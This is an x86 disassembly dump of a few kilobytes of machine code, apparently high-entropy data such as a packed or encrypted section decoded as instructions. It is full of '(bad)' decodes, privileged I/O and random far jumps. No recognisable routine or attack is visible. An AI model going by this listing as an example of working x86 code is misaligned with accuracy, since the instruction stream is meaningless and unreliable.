  41705d:	(bad)  
  41705e:	xchg   ecx,eax
  41705f:	mov    esp,0x790923a
  417064:	and    dh,BYTE PTR [eax-0x3f]
  417067:	mov    bh,0x2
  417069:	xchg   esi,eax
  41706a:	stc    
  41706b:	cmp    ecx,DWORD PTR [ebx+0x3e73f17f]
  417071:	(bad)
  417076:	pop    ebp
  417077:	dec    eax
  417078:	fwait
  417079:	jno    0x4170d1
  41707b:	shl    DWORD PTR [ecx-0xb5fd380],1
  417081:	sub    ebx,DWORD PTR [edx-0x4a]
  417084:	lds    esp,FWORD PTR [ebx+edx*4+0x65]
  417088:	iret   
  417089:	sbb    esp,DWORD PTR [esi+0x16]
  41708c:	icebp  
  41708d:	popa   
  41708e:	rcl    DWORD PTR [esi-0x1b],1
  417091:	cmp    bh,BYTE PTR [edx]
  417093:	iret   
  417094:	or     al,BYTE PTR [edx+esi*8-0x38]
  417098:	pushf  
  417099:	in     eax,0x97
  41709b:	push   edi
  41709c:	out    0xe7,eax
  41709e:	repz adc al,0xab
  4170a1:	(bad)  
  4170a3:	pop    edx
  4170a4:	addr16 clc 
  4170a6:	dec    esi
  4170a7:	xor    esi,0x9613a837
  4170ad:	lds    esi,FWORD PTR [edi-0x4627f136]
  4170b3:	rcl    BYTE PTR [ebx],0xc
  4170b6:	in     eax,dx
  4170b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170b8:	mov    edx,?
  4170ba:	scas   eax,DWORD PTR es:[edi]
  4170bb:	jle    0x417063
  4170bd:	loope  0x417086
  4170bf:	aam    0x9
  4170c1:	dec    ebx
  4170c2:	(bad)  
  4170c3:	in     eax,0x50
  4170c5:	je     0x41710a
  4170c7:	cld    
  4170c8:	mov    ecx,0xf77ebd67
  4170cd:	mov    WORD PTR [esi-0x73],?
  4170d0:	xor    al,0x91
  4170d2:	cmpxchg BYTE PTR [ecx],dh
  4170d5:	mov    eax,ds:0x47ecbc55
  4170da:	out    0x54,eax
  4170dc:	or     al,0x0
  4170de:	stos   BYTE PTR es:[edi],al
  4170df:	lock sbb dl,bl
  4170e2:	call   0xa847c4ac
  4170e7:	mov    es,WORD PTR [edi-0x3a591016]
  4170ed:	inc    ebx
  4170ee:	and    al,0x10
  4170f0:	fwait
  4170f1:	inc    ecx
  4170f2:	mov    cl,0xce
  4170f4:	sbb    al,0xe1
  4170f6:	int    0xd8
  4170f8:	packuswb mm6,QWORD PTR ds:0x7b503ae2
  4170ff:	pop    es
  417100:	xchg   ebx,eax
  417101:	sbb    esi,ebx
  417103:	mov    al,cl
  417105:	adc    BYTE PTR [edx+0x6],dl
  417108:	dec    ecx
  417109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41710a:	add    eax,0x21d8c3a
  41710f:	sbb    DWORD PTR [eax+0x1b],eax
  417112:	jg     0x4170a8
  417114:	test   al,0x95
  417116:	aam    0xf6
  417118:	retf   
  417119:	in     eax,dx
  41711a:	xor    ebp,DWORD PTR [edx+0x4515fcaf]
  417120:	inc    edx
  417121:	mov    bh,0x81
  417123:	outs   dx,BYTE PTR ds:[esi]
  417124:	arpl   WORD PTR [ebp+0x41],dx
  417127:	add    eax,0x483e372a
  41712c:	in     al,dx
  41712d:	mov    cl,0x8f
  41712f:	add    DWORD PTR [ebx+edx*8+0x1af30987],edx
  417136:	shr    BYTE PTR ds:[esi-0xc76ca14],0x3e
  41713e:	push   esi
  41713f:	jmp    0x9764:0x13d36fe5
  417146:	dec    ebp
  417147:	sub    dl,0x5f
  41714a:	int    0x6c
  41714c:	lods   al,BYTE PTR ds:[esi]
  41714d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41714e:	mov    ebp,0xdcd64ad7
  417153:	cmc    
  417154:	jns    0x4171a4
  417156:	pop    ebx
  417157:	call   0x6d94:0x1e4bca54
  41715e:	push   ds
  41715f:	repz fadd DWORD PTR [edi+edx*1-0x3d8844d4]
  417167:	cmp    ah,BYTE PTR ds:0x6f573c6b
  41716d:	(bad)  
  41716e:	push   cs
  41716f:	push   eax
  417170:	sbb    ah,0x78
  417173:	stos   DWORD PTR es:[edi],eax
  417174:	popf   
  417175:	jbe    0x4171cc
  417177:	mov    bl,ah
  417179:	add    eax,0x6c60cce0
  41717e:	fsubr  QWORD PTR [ebx-0x2e]
  417181:	in     al,0xdd
  417183:	xchg   al,al
  417185:	stos   DWORD PTR es:[edi],eax
  417186:	or     al,0x84
  417188:	adc    DWORD PTR [edi+0x25a7c2a6],eax
  41718e:	push   esi
  41718f:	jne    0x417149
  417191:	cmp    DWORD PTR [ebx-0x3b8c07ba],ecx
  417197:	pushf  
  417198:	push   ds
  417199:	stos   BYTE PTR es:[edi],al
  41719a:	jecxz  0x417140
  41719c:	adc    al,0x1e
  41719e:	sahf   
  41719f:	sub    al,0x14
  4171a1:	test   eax,0x17251fdf
  4171a6:	rcl    DWORD PTR [eax-0x4a],0xd5
  4171aa:	ds dec edi
  4171ac:	dec    ebx
  4171ad:	sub    al,0xd6
  4171af:	dec    edi
  4171b0:	push   ss
  4171b1:	cdq    
  4171b2:	and    eax,0x444c1cdc
  4171b7:	dec    ebx
  4171b8:	test   eax,0xe0bd9262
  4171bd:	arpl   WORD PTR [esi+0x1b],bp
  4171c0:	dec    esi
  4171c1:	loop   0x4171de
  4171c3:	retf   0xba24
  4171c6:	outs   dx,BYTE PTR ds:[esi]
  4171c7:	cld    
  4171c8:	and    DWORD PTR [edi-0x5e],eax
  4171cb:	pop    es
  4171cc:	mov    ebx,0xa134ac94
  4171d1:	out    0x1a,al
  4171d3:	xchg   DWORD PTR [edx+0x6e],esp
  4171d6:	mov    dh,0x8d
  4171d8:	test   DWORD PTR [ebx],esi
  4171da:	iret   
  4171db:	push   es
  4171dc:	js     0x4171a2
  4171de:	mov    edx,0x79636073
  4171e3:	xchg   ebx,eax
  4171e4:	std    
  4171e5:	vmread DWORD PTR [ebx-0x19],edx
  4171e9:	inc    eax
  4171ea:	in     eax,dx
  4171eb:	and    DWORD PTR [eax-0x72],ebp
  4171ee:	pop    ebp
  4171ef:	iret   
  4171f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171f1:	les    esi,FWORD PTR [ebx]
  4171f3:	jecxz  0x4171c0
  4171f5:	jne    0x41718b
  4171f7:	jns    0x417243
  4171f9:	gs push cs
  4171fb:	js     0x41724a
  4171fd:	lahf   
  4171fe:	mov    esi,0x893ac77f
  417203:	xor    DWORD PTR [ebx+0x21],ebx
  417206:	and    dh,BYTE PTR [ebx-0x67]
  417209:	cld    
  41720a:	pop    esp
  41720b:	or     eax,DWORD PTR [ebx]
  41720d:	cld    
  41720e:	inc    edi
  41720f:	mov    ebx,0x66ef9afd
  417214:	cmp    al,0x20
  417216:	and    cl,dh
  417218:	inc    ecx
  417219:	jbe    0x41719d
  41721b:	sbb    al,0xeb
  41721d:	cmp    BYTE PTR [ebp+0x112138f2],dh
  417223:	test   DWORD PTR es:[ecx+0x1fc276fe],esi
  41722a:	popa   
  41722b:	push   ecx
  41722c:	mov    DWORD PTR [ebp-0x5c],edx
  41722f:	push   ebx
  417230:	loopne 0x417219
  417232:	inc    edi
  417233:	push   eax
  417234:	sub    DWORD PTR [esi-0x5cbba13f],ebx
  41723a:	adc    ecx,DWORD PTR [ebp-0x2601af30]
  417240:	test   DWORD PTR [edx-0x23],0x36faa75f
  417247:	pavgw  mm0,QWORD PTR [esi+0x81a83f5]
  41724e:	popa   
  41724f:	adc    ebp,DWORD PTR [ebp-0x16841665]
  417255:	stos   DWORD PTR es:[edi],eax
  417256:	mov    dl,0x88
  417258:	or     DWORD PTR [edi+0x70aac3e],eax
  41725e:	retf   0x16a4
  417261:	ret    0xdaa8
  417264:	mov    ebp,ss
  417266:	gs jmp 0x816e:0xf6b046f1
  41726e:	mov    bl,0xfd
  417270:	das    
  417271:	mov    DWORD PTR [edi+0x3e],ebp
  417274:	adc    ebp,DWORD PTR [ebp+0x16]
  417277:	cmp    BYTE PTR [ebp-0x3d],al
  41727a:	add    al,0x4b
  41727c:	pop    ss
  41727d:	lea    esi,[esi]
  41727f:	cmc    
  417280:	int3   
  417281:	mov    edi,0x9a02ff12
  417286:	xor    esi,DWORD PTR [eax+0x6ce12f17]
  41728c:	inc    edi
  41728d:	push   ebp
  41728e:	daa    
  41728f:	fisttp WORD PTR [ecx-0x2caeb2c]
  417295:	mov    esi,0x871132d0
  41729a:	call   0x9b71:0x5eefcc60
  4172a1:	mov    bl,0x1
  4172a3:	xor    DWORD PTR [edi],ecx
  4172a5:	nop
  4172a6:	adc    al,0x5d
  4172a8:	out    dx,al
  4172a9:	shl    BYTE PTR [eax-0x4],0x20
  4172ad:	(bad)  
  4172ae:	and    esi,eax
  4172b0:	je     0x41731f
  4172b2:	pusha  
  4172b3:	add    eax,0xbfc557ac
  4172b8:	mov    ebx,0xdb082090
  4172bd:	push   0xe8ee1133
  4172c2:	int    0x40
  4172c4:	jmp    0x4172ba
  4172c6:	fdiv   st(2),st
  4172c8:	and    ecx,DWORD PTR [ebx+0x78]
  4172cb:	ficomp DWORD PTR [ecx-0x2b]
  4172ce:	jb     0x417275
  4172d0:	cmp    DWORD PTR [eax-0x5b8e087c],edi
  4172d6:	aad    0x10
  4172d8:	repnz pop ebp
  4172da:	sub    eax,esi
  4172dc:	jl     0x417286
  4172de:	adc    ebp,DWORD PTR [esi-0x575a1a70]
  4172e4:	dec    BYTE PTR [esi-0x5e]
  4172e7:	push   ss
  4172e8:	jb     0x4172a4
  4172ea:	mov    dl,0xcf
  4172ec:	mov    esi,0x191ad389
  4172f1:	in     al,dx
  4172f2:	xchg   ebx,eax
  4172f3:	cmp    DWORD PTR [eax+ebx*2+0x58],edx
  4172f7:	dec    eax
  4172f8:	out    0x1,al
  4172fa:	aam    0x6d
  4172fc:	sbb    BYTE PTR [ebp+ecx*4-0x74f45ab3],dl
  417303:	sbb    al,0x6c
  417305:	stc    
  417306:	das    
  417307:	and    bl,BYTE PTR [edi]
  417309:	into   
  41730a:	mov    eax,0xc7a954ac
  41730f:	call   0x53ee4474
  417314:	js     0x417359
  417316:	into   
  417317:	out    0x14,al
  417319:	sti    
  41731a:	mov    ah,0xa0
  41731c:	outs   dx,DWORD PTR ds:[esi]
  41731d:	and    ch,BYTE PTR [edx]
  41731f:	mov    ecx,0x8a24de96
  417324:	retf   0x128
  417327:	lods   eax,DWORD PTR ds:[esi]
  417328:	icebp  
  417329:	xor    al,BYTE PTR [edx-0x2a]
  41732c:	les    ecx,FWORD PTR [ebp+0x62]
  41732f:	jb     0x417391
  417331:	clc    
  417332:	and    eax,0x712baa36
  417337:	add    ecx,DWORD PTR ds:[eax+0x1bd188e3]
  41733e:	push   edi
  41733f:	shr    esp,cl
  417341:	push   edx
  417342:	jns    0x4173ac
  417344:	ja     0x41737f
  417346:	arpl   WORD PTR [edx-0x2b3480db],ax
  41734c:	cmp    dh,al
  41734e:	xchg   edi,eax
  41734f:	mov    dl,cl
  417351:	adc    eax,0xd513be30
  417356:	(bad)  
  417357:	loope  0x417332
  417359:	mov    edx,0x4d9b7090
  41735e:	cmp    eax,0x8bd06543
  417363:	in     al,0x3
  417365:	outs   dx,DWORD PTR ds:[esi]
  417366:	push   edi
  417367:	retf   
  417368:	push   ebp
  417369:	push   ebp
  41736a:	popw   es
  41736c:	aad    0x4f
  41736e:	(bad)  
  41736f:	sar    BYTE PTR [ebx+0x40],0x7e
  417373:	mov    ?,WORD PTR [edx-0x142baee5]
  417379:	push   0xe5b1adfb
  41737e:	out    dx,al
  41737f:	out    0xd4,eax
  417381:	ret    0xa062
  417384:	ja     0x4173c3
  417386:	push   esp
  417387:	cwde   
  417388:	shl    BYTE PTR [eax],1
  41738a:	xor    esp,edi
  41738c:	mov    bh,BYTE PTR [eax+0x28]
  41738f:	push   eax
  417390:	adc    eax,0x4d636b81
  417395:	rcl    BYTE PTR [ebx-0x23],0x8b
  417399:	fld    DWORD PTR [edi-0x53]
  41739c:	push   eax
  41739d:	(bad)  
  41739e:	stos   DWORD PTR es:[edi],eax
  41739f:	jbe    0x41736e
  4173a1:	mov    esi,0xecfd65ab
  4173a6:	or     BYTE PTR [edx],0x5c
  4173a9:	loop   0x41737c
  4173ab:	shl    DWORD PTR ss:[ecx],1
  4173ae:	xor    DWORD PTR [edx+eax*8+0x73],ebx
  4173b2:	das    
  4173b3:	lea    ebp,[esi]
  4173b5:	pop    ecx
  4173b6:	pusha  
  4173b7:	sub    ch,bh
  4173b9:	xor    eax,0xf43b4092
  4173be:	aad    0x92
  4173c0:	inc    ebx
  4173c1:	loopne 0x41739a
  4173c3:	dec    eax
  4173c4:	fist   WORD PTR [edx-0x62ccd32d]
  4173ca:	or     dl,BYTE PTR [edx+0x7cc0aa32]
  4173d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173d1:	inc    edi
  4173d2:	jnp    0x4173d6
  4173d4:	mov    ss,WORD PTR [ebp+0x7c6b2271]
  4173da:	xor    BYTE PTR [ecx+ebx*2],al
  4173dd:	cmp    al,0xd0
  4173df:	lods   al,BYTE PTR ds:[esi]
  4173e0:	addr16 pop edi
  4173e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173e3:	js     0x41738c
  4173e5:	dec    esi
  4173e6:	cmp    DWORD PTR [edx-0x2610a75f],esi
  4173ec:	(bad)  
  4173ed:	inc    ebp
  4173ee:	bound  ecx,QWORD PTR [edx-0x79]
  4173f1:	imul   ebx,eax,0xffffffff
  4173f4:	sbb    esi,DWORD PTR [esi+0x26]
  4173f7:	dec    ebp
  4173f8:	(bad)  
  4173f9:	not    dh
  4173fb:	popa   
  4173fc:	mov    bh,0xd3
  4173fe:	cs retf 0xa061
  417402:	jg     0x417483
  417404:	mov    DWORD PTR [esi-0x3c],0x732bd548
  41740b:	pop    esp
  41740c:	xchg   ebx,eax
  41740d:	test   al,0x35
  41740f:	or     BYTE PTR [esi+0x31],bh
  417412:	rol    DWORD PTR ds:0xc2a94f03,0x2e
  417419:	das    
  41741a:	sub    al,0x87
  41741c:	sub    bh,BYTE PTR [ebx]
  41741e:	sub    esi,esi
  417420:	lock cs into 
  417423:	mov    ds:0xf2e9032c,eax
  417428:	add    bl,BYTE PTR [esi+ecx*4]
  41742b:	ret    
  41742c:	stos   BYTE PTR es:[edi],al
  41742d:	mov    al,0x52
  41742f:	std    
  417430:	scas   eax,DWORD PTR es:[edi]
  417431:	and    al,0x71
  417433:	outs   dx,DWORD PTR ds:[esi]
  417434:	xor    eax,DWORD PTR [eax-0xf9830fd]
  41743a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41743b:	sub    dh,BYTE PTR [edi+ebx*1+0x30]
  41743f:	je     0x417416
  417441:	scas   eax,DWORD PTR es:[edi]
  417442:	jge    0x4173e4
  417444:	xchg   ebp,eax
  417445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417446:	aad    0xf4
  417448:	fwait
  417449:	outs   dx,DWORD PTR ds:[esi]
  41744a:	sbb    DWORD PTR [ebp+0x4f],esp
  41744d:	push   ds
  41744e:	or     edx,DWORD PTR [edx-0x66]
  417451:	ins    BYTE PTR es:[edi],dx
  417452:	pop    ebx
  417453:	jmp    0x94e8b610
  417458:	mov    edi,0xd87bba31
  41745d:	(bad)  
  41745e:	jge    0x4174af
  417460:	jne    0x417470
  417462:	xor    ecx,esi
  417464:	mov    esp,DWORD PTR [edx]
  417466:	xor    edi,DWORD PTR [eax+0x195e230f]
  41746c:	push   0xc6b66b4c
  417471:	push   esi
  417472:	jle    0x41742d
  417474:	repnz pusha 
  417476:	jbe    0x4174e0
  417478:	out    dx,eax
  417479:	mov    ch,0x48
  41747b:	sti    
  41747c:	pop    ebx
  41747d:	jo     0x417406
  41747f:	mov    esi,edi
  417481:	add    dh,bl
  417483:	jne    0x41742e
  417485:	(bad)
  41748a:	add    al,0xa
  41748c:	push   0xffffffc5
  41748e:	nop
  41748f:	lock mov al,0xb7
  417492:	inc    ebx
  417493:	sbb    al,0x5e
  417495:	push   eax
  417496:	and    eax,0x300ad89c
  41749b:	adc    DWORD PTR [esi+ebx*1-0x6d68ed80],0x53
  4174a3:	pop    es
  4174a4:	test   DWORD PTR [edi],ebp
  4174a6:	loope  0x417501
  4174a8:	xchg   edi,eax
  4174a9:	in     al,0xb4
  4174ab:	bound  ebp,QWORD PTR [ebx+0x5c]
  4174ae:	sub    BYTE PTR [ebp-0x954fdd],dh
  4174b4:	sub    al,0x8e
  4174b6:	add    BYTE PTR ds:0x5147d0d3,dh
  4174bc:	jg     0x4174cc
  4174be:	inc    edx
  4174bf:	inc    esi
  4174c0:	aas    
  4174c1:	sub    esi,eax
  4174c3:	pop    eax
  4174c4:	clc    
  4174c5:	sbb    BYTE PTR [ecx-0xe],0xab
  4174c9:	add    eax,0x7d0b7261
  4174ce:	add    al,dl
  4174d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174d1:	(bad)  
  4174d2:	sbb    bh,BYTE PTR [edx+0x67944892]
  4174d8:	icebp  
  4174d9:	push   edx
  4174da:	sbb    DWORD PTR [eax],ebx
  4174dc:	arpl   WORD PTR [ebx],cx
  4174de:	xchg   edi,eax
  4174df:	mov    BYTE PTR [edx+0xb5fb2b5],bl
  4174e5:	xlat   BYTE PTR ds:[ebx]
  4174e6:	add    al,0x18
  4174e8:	xor    DWORD PTR [ebp-0x4f794ddb],0xffffffc1
  4174ef:	jne    0x4174f1
  4174f1:	jmp    0xd5265427
  4174f6:	fs jecxz 0x4174fa
  4174f9:	stos   BYTE PTR es:[edi],al
  4174fa:	xor    eax,0xe4ce2ace
  4174ff:	inc    edi
  417500:	lea    ecx,[edi-0x4e]
  417503:	push   esp
  417504:	jmp    0x417507
  417506:	mov    al,0xf1
  417508:	or     bh,dh
  41750a:	or     esi,edx
  41750c:	rcl    DWORD PTR [ebp+0x23],cl
  41750f:	jno    0x4174e4
  417511:	call   0x1862c803
  417516:	mov    dl,0x1e
  417518:	mov    dl,0x41
  41751a:	xchg   esi,eax
  41751b:	call   0xc2087c0a
  417520:	adc    ebp,esp
  417522:	ffree  st(7)
  417524:	adc    al,0xba
  417526:	(bad)  
  417527:	xchg   esi,eax
  417528:	inc    esi
  417529:	sub    esi,DWORD PTR [ecx+0x40ebe51e]
  41752f:	mov    edx,DWORD PTR [eax-0x33]
  417532:	dec    ebp
  417533:	xchg   edx,eax
  417534:	push   esi
  417535:	cmp    eax,0xa46a4d28
  41753a:	or     DWORD PTR [ecx-0x1788161f],0x7194bf95
  417544:	sub    al,0x6
  417546:	stc    
  417547:	add    al,0x34
  417549:	push   edx
  41754a:	mov    ch,0xd
  41754c:	xchg   ebp,eax
  41754d:	enter  0x156f,0xd
  417551:	scas   al,BYTE PTR es:[edi]
  417552:	call   0x379d3225
  417557:	xchg   BYTE PTR [esi+0x5094c3c9],ah
  41755d:	out    0xa0,al
  41755f:	outs   dx,BYTE PTR ds:[esi]
  417560:	test   al,0xcb
  417562:	xor    cl,BYTE PTR ds:0x67501458
  417568:	repnz inc edx
  41756a:	mov    bh,0x23
  41756c:	inc    ecx
  41756d:	jg     0x4175c5
  41756f:	jmp    0x4175d0
  417571:	jmp    0x417547
  417573:	rol    ecx,1
  417575:	adc    DWORD PTR [ebx-0x72],eax
  417578:	cld    
  417579:	fldcw  WORD PTR [eax-0x3]
  41757c:	in     eax,0xad
  41757e:	pop    ds
  41757f:	pop    ebp
  417580:	fist   WORD PTR [edx-0x52]
  417583:	aad    0xe5
  417585:	mov    edx,0x34daee2d
  41758a:	pop    ss
  41758b:	mov    edx,0x672b72c8
  417590:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  417592:	push   ss
  417593:	ins    BYTE PTR es:[edi],dx
  417594:	jmp    0xde8a7991
  417599:	push   cs
  41759a:	dec    edx
  41759b:	jge    0x4175e9
  41759d:	add    edx,DWORD PTR [ecx-0x6a319a08]
  4175a3:	jne    0x4175fc
  4175a5:	ficomp DWORD PTR [eax]
  4175a7:	mov    eax,0xa15c4e99
  4175ac:	in     al,0xef
  4175ae:	aas    
  4175af:	repnz dec ebp
  4175b1:	add    cl,BYTE PTR [edx-0x64]
  4175b4:	jns    0x4175ab
  4175b6:	pop    ebp
  4175b7:	add    DWORD PTR [edx],0x61bbe4d3
  4175bd:	or     al,0xe1
  4175bf:	fwait
  4175c0:	cwde   
  4175c1:	or     esp,edx
  4175c3:	mov    ebx,0xc0164b95
  4175c8:	sahf   
  4175c9:	mov    DWORD PTR [edx],esi
  4175cb:	inc    edi
  4175cc:	fbstp  TBYTE PTR [edx-0x1cad46f8]
  4175d2:	cmp    eax,0x3718094d
  4175d7:	inc    edx
  4175d8:	or     al,0x1b
  4175da:	inc    edi
  4175db:	inc    esi
  4175dc:	ins    BYTE PTR es:[edi],dx
  4175dd:	cld    
  4175de:	sub    al,BYTE PTR [eax]
  4175e0:	je     0x4175d8
  4175e2:	(bad)  
  4175e3:	gs fsub st(3),st
  4175e6:	test   eax,0xdfff3196
  4175eb:	(bad)  
  4175ef:	xor    ebp,DWORD PTR [esi]
  4175f1:	jne    0x41757a
  4175f3:	rcl    BYTE PTR [edi-0x48],1
  4175f6:	imul   esi,DWORD PTR [eax],0x23
  4175f9:	push   es
  4175fa:	or     al,0x92
  4175fc:	jnp    0x41758f
  4175fe:	in     al,dx
  4175ff:	jbe    0x4175f4
  417601:	test   BYTE PTR [eax],cl
  417603:	mov    ebp,0x184f1106
  417608:	repnz add eax,0x51e6a3f9
  41760e:	mov    eax,ds:0xa2b1fee8
  417613:	ins    BYTE PTR es:[edi],dx
  417614:	neg    ch
  417616:	push   ecx
  417617:	pushf  
  417618:	fisub  DWORD PTR [edi+0x4c2fbd3c]
  41761e:	data16 sbb BYTE PTR [eax+0x3c],dl
  417622:	or     al,BYTE PTR [ecx]
  417624:	pop    edx
  417625:	xor    al,0xb1
  417627:	mov    cl,0x44
  417629:	fisubr DWORD PTR [eax-0x448388b1]
  41762f:	in     eax,0xc0
  417631:	ins    DWORD PTR es:[edi],dx
  417632:	or     edx,DWORD PTR [eax+0x64]
  417635:	dec    esp
  417636:	xchg   edi,eax
  417637:	fistp  WORD PTR [ebx+0x71c73f52]
  41763d:	jbe    0x41763d
  41763f:	outs   dx,BYTE PTR ds:[esi]
  417640:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417641:	ficom  DWORD PTR [ecx+edx*2]
  417644:	inc    esp
  417645:	mov    bh,0x67
  417647:	fadd   QWORD PTR [edx-0x116dc562]
  41764d:	cs (bad) 
  41764f:	(bad)  
  417650:	out    0x8e,al
  417652:	jecxz  0x41761d
  417654:	jns    0x4175ee
  417656:	mov    esp,0x12fabb0a
  41765b:	cld    
  41765c:	int3   
  41765d:	das    
  41765e:	xchg   ebx,eax
  41765f:	push   0x466ef907
  417664:	cld    
  417665:	or     eax,0x26c272c0
  41766a:	jle    0x4176ce
  41766c:	out    0x30,eax
  41766e:	inc    ebx
  41766f:	mov    ecx,0x7bae2fbb
  417674:	inc    esp
  417675:	push   edx
  417676:	mov    DWORD PTR [ecx-0x5155e789],ecx
  41767c:	and    eax,DWORD PTR [ebp-0x8732223]
  417682:	test   DWORD PTR [esi],0xef0e830d
  417688:	xchg   DWORD PTR [edx+0x18],edi
  41768b:	shr    DWORD PTR [esi-0x62],0xdd
  41768f:	(bad)  
  417690:	mov    ds:0x40d660cf,eax
  417695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417696:	mov    ebp,0x1b45f09
  41769b:	inc    ebx
  41769c:	cmp    al,0x43
  41769e:	sbb    DWORD PTR [eax-0x620895e2],ebx
  4176a4:	(bad)  
  4176a5:	jbe    0x417722
  4176a7:	int3   
  4176a8:	jb     0x417664
  4176aa:	sub    al,BYTE PTR [ecx-0x449d1a49]
  4176b0:	popa   
  4176b1:	push   ebx
  4176b2:	adc    BYTE PTR [ebx+edx*8+0x46],al
  4176b6:	dec    esp
  4176b7:	dec    ebp
  4176b8:	sub    dl,BYTE PTR [esi]
  4176ba:	pop    ecx
  4176bb:	daa    
  4176bc:	xchg   edi,eax
  4176bd:	xor    eax,eax
  4176bf:	inc    esi
  4176c0:	dec    eax
  4176c1:	mov    ebx,DWORD PTR [ebp+0x4d]
  4176c4:	dec    ebx
  4176c5:	pop    esp
  4176c6:	mov    edi,0x937e2d89
  4176cb:	jecxz  0x4176cb
  4176cd:	dec    esp
  4176ce:	inc    DWORD PTR ds:0x2d37dd47
  4176d4:	push   esi
  4176d5:	pop    es
  4176d6:	adc    al,0x90
  4176d8:	lds    edi,FWORD PTR [edx-0x7d]
  4176db:	pop    edx
  4176dc:	and    edx,ecx
  4176de:	push   ebp
  4176df:	pop    ebp
  4176e0:	aaa    
  4176e1:	push   esi
  4176e2:	and    dl,BYTE PTR [ebx]
  4176e4:	pop    ebp
  4176e5:	sbb    al,0xab
  4176e7:	call   0x2f7139db
  4176ec:	fsubr  DWORD PTR [ebp+edi*4+0x53]
  4176f0:	out    dx,al
  4176f1:	push   esp
  4176f2:	jbe    0x4176b2
  4176f4:	jmp    0x7ad1:0x32e5db06
  4176fb:	and    eax,0xbafde2e8
  417700:	(bad)  
  417701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417702:	xchg   ebx,eax
  417703:	dec    edx
  417704:	push   es
  417705:	imul   esp,DWORD PTR [eax+0x9],0x8c4a5de7
  41770c:	dec    esi
  41770d:	adc    al,0x7d
  41770f:	mov    dl,0x91
  417711:	inc    eax
  417712:	aad    0x5d
  417714:	cwde   
  417715:	push   0xd980b97f
  41771a:	xor    al,0xe3
  41771c:	xchg   ebp,eax
  41771d:	dec    edi
  41771e:	cmp    DWORD PTR [esi+0xf794154],esp
  417724:	push   eax
  417725:	inc    edi
  417726:	fwait
  417727:	test   BYTE PTR [ecx-0x50502e96],cl
  41772d:	sub    eax,0x5f70857c
  417732:	clc    
  417733:	aas    
  417734:	test   al,0x4e
  417736:	cli    
  417737:	push   ebx
  417738:	ins    DWORD PTR es:[edi],dx
  417739:	jne    0x417738
  41773b:	mov    cl,0x12
  41773d:	jns    0x417745
  41773f:	cmp    ah,BYTE PTR [esi]
  417741:	mov    al,0x43
  417743:	cmc    
  417744:	mov    ds:0x9952a498,eax
  417749:	push   es
  41774a:	push   esi
  41774b:	adc    eax,eax
  41774d:	inc    ebp
  41774e:	loopne 0x417736
  417750:	pop    esi
  417751:	pop    ss
  417752:	pop    ebx
  417753:	cld    
  417754:	mov    edi,0x787df90d
  417759:	push   ss
  41775a:	sbb    bh,BYTE PTR [ebx-0x7c]
  41775d:	rol    BYTE PTR [edx-0x21ad5ee8],0x53
  417764:	shr    BYTE PTR [ebx],cl
  417766:	mov    BYTE PTR [eax],ah
  417768:	xchg   DWORD PTR [edi-0x7c],ebx
  41776b:	pop    ecx
  41776c:	outs   dx,DWORD PTR ds:[esi]
  41776d:	push   ebp
  41776e:	jne    0x417740
  417770:	xchg   si,ax
  417772:	fprem  
  417774:	add    eax,0x851dae13
  417779:	aas    
  41777a:	aaa    
  41777b:	aaa    
  41777c:	mov    al,0x80
  41777e:	call   FWORD PTR [edx]
  417780:	cli    
  417781:	add    al,BYTE PTR [eax-0x43]
  417784:	and    BYTE PTR [esi+0x22],al
  417787:	dec    esp
  417788:	mov    ecx,ebx
  41778a:	and    bh,BYTE PTR [edi]
  41778c:	ins    BYTE PTR es:[edi],dx
  41778d:	pop    edi
  41778e:	adc    ecx,ecx
  417790:	push   edx
  417791:	into   
  417792:	pop    ds
  417793:	sub    al,0xf2
  417795:	out    dx,al
  417796:	pop    eax
  417797:	ins    BYTE PTR es:[edi],dx
  417798:	(bad)  
  417799:	repz jns 0x41772a
  41779c:	rcr    BYTE PTR [edx+0x26],1
  41779f:	pusha  
  4177a0:	ror    BYTE PTR [esi+0x343c590c],1
  4177a6:	add    al,0x1a
  4177a8:	push   es
  4177a9:	mov    ebx,0xe56adbd8
  4177ae:	add    al,0x97
  4177b0:	nop
  4177b1:	pop    eax
  4177b2:	push   esi
  4177b3:	sub    dl,BYTE PTR [esi+0x2e5e53dd]
  4177b9:	imul   eax,DWORD PTR [eax],0xffffffa4
  4177bc:	retf   0xda70
  4177bf:	inc    esi
  4177c0:	jp     0x417760
  4177c2:	dec    eax
  4177c3:	fwait
  4177c4:	mov    ebx,0x9ad26e83
  4177c9:	lahf   
  4177ca:	out    dx,al
  4177cb:	fimul  WORD PTR [ebx-0x4a]
  4177ce:	jnp    0x417802
  4177d0:	inc    edi
  4177d1:	repnz push ss
  4177d3:	imul   ecx,DWORD PTR [eax],0xffffffc3
  4177d6:	or     esi,DWORD PTR [esi-0x27abc6d8]
  4177dc:	xchg   esi,eax
  4177dd:	repz out dx,eax
  4177df:	fwait
  4177e0:	mov    ds,WORD PTR [eax+0x7b]
  4177e3:	mov    ecx,0x713be635
  4177e8:	adc    al,0xbf
  4177ea:	sbb    ah,dl
  4177ec:	sbb    BYTE PTR [edi+ebx*4],cl
  4177ef:	push   0x6d
  4177f1:	icebp  
  4177f2:	pop    edx
  4177f3:	add    BYTE PTR [esp+eax*8+0x2],ah
  4177f7:	out    dx,eax
  4177f8:	cs push ebp
  4177fa:	sub    DWORD PTR [ecx-0x1],ebp
  4177fd:	fisubr WORD PTR [ebp+edi*4-0x14f4cc13]
  417804:	inc    eax
  417805:	pusha  
  417806:	mov    ch,BYTE PTR [edi-0x65fc1362]
  41780c:	sbb    DWORD PTR [esi-0x62],esp
  41780f:	in     eax,0x82
  417811:	jg     0x417833
  417813:	call   DWORD PTR [ebp-0x524654dc]
  417819:	test   al,0x6c
  41781b:	das    
  41781c:	shl    esi,0xaa
  41781f:	jne    0x4177c6
